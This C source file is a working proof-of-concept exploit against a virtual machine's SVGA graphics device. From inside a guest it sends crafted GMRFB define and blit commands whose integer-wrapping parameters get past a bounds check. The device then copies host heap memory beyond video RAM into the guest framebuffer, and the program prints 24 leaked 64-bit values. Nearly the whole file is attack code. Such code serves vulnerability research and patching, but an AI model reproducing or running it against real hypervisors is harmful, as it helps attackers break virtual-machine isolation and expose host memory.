#include <err.h>
#include <stdlib.h>
#include <string.h>

#include "svga.h"
#include "svga_reg.h"

SVGADevice gSVGA;

void
get_parameters(uint32_t offset, uint32_t *bytesPerLine, int *srcOrigin_x)
{
	/* offsetSource = (pCmd->srcOrigin.x * pSVGAState->GMRFB.format.s.bitsPerPixel) / 8 + pSVGAState->GMRFB.bytesPerLine * pCmd->srcOrigin.y; */
	*srcOrigin_x = (gSVGA.vramSize + offset)/4;
	/* AssertMsgReturn(offSrc + cbSrcPitch * (cHeight - 1) + cbWidth <= pThis->vram_size */
	*bytesPerLine = (0x100000000 - ((gSVGA.vramSize + offset) + sizeof(void *)));
}

uint64_t
read_mem64(uint32_t offset)
{
	uint64_t *fb_infoleak;
	uint64_t leaked_heap_memory;

	SVGAFifoCmdDefineGMRFB gmrfb = {0};
	SVGAFifoCmdBlitGMRFBToScreen screen = {0};

	get_parameters(offset, &gmrfb.bytesPerLine, &screen.srcOrigin.x);

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	SVGA_WriteReg(SVGA_REG_WIDTH, 0x320);
	SVGA_WriteReg(SVGA_REG_HEIGHT, 0x260);
	/* svga.uBpp */
	SVGA_WriteReg(SVGA_REG_BITS_PER_PIXEL, 32);

	gmrfb.ptr.gmrId = SVGA_GMR_FRAMEBUFFER;
	gmrfb.ptr.offset = 0;
	/* gmrfb.bytesPerLine = 0xDEADBE00; */
	/* AssertBreak(pSVGAState->GMRFB.format.s.bitsPerPixel == pThis->svga.uBpp); */
	gmrfb.format.bitsPerPixel = 32;

	VMwareWriteWordToFIFO(SVGA_CMD_DEFINE_GMRFB);
	VMwareWriteWordToFIFO(gmrfb.ptr.gmrId);
	VMwareWriteWordToFIFO(gmrfb.ptr.offset);
	VMwareWriteWordToFIFO(gmrfb.bytesPerLine);
	VMwareWriteWordToFIFO(gmrfb.format.bitsPerPixel);

	VMwareWaitForFB();

	/* screen.srcOrigin.x = 0xDEADBE00; */
	screen.srcOrigin.y = 0;
	screen.destRect.left = 0;
	screen.destRect.top = 0;
	screen.destScreenId = 0;

	/* used for width calculation */
	screen.destRect.right = 2;
	/* used for height calculation */
	screen.destRect.bottom = 2;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_CMD_BLIT_GMRFB_TO_SCREEN);
	VMwareWriteWordToFIFO(screen.srcOrigin.x);
	VMwareWriteWordToFIFO(screen.srcOrigin.y);
	VMwareWriteWordToFIFO(screen.destRect.left);
	VMwareWriteWordToFIFO(screen.destRect.top);
	VMwareWriteWordToFIFO(screen.destRect.right);
	VMwareWriteWordToFIFO(screen.destRect.bottom);
	VMwareWriteWordToFIFO(screen.destScreenId);

	VMwareWaitForFB();

	fb_infoleak = (uint64_t *)gSVGA.fbMem;
	leaked_heap_memory = fb_infoleak[0];

	return leaked_heap_memory;
}

int main(int argc, char **argv)
{

	if (conf_svga_device() != 0)
		errx(EXIT_FAILURE, "[!] Error initializing SVGA device");

	memset(gSVGA.fbMem, 0x41, gSVGA.fbSize);

	warnx("[+] Reading memory beyond VRAM...");
	for (int offset = 0; offset < 24; offset++) {
		warnx("[%d]> 0x%lx", offset, read_mem64(offset * sizeof(void *)));
	}	

	return 0;
}
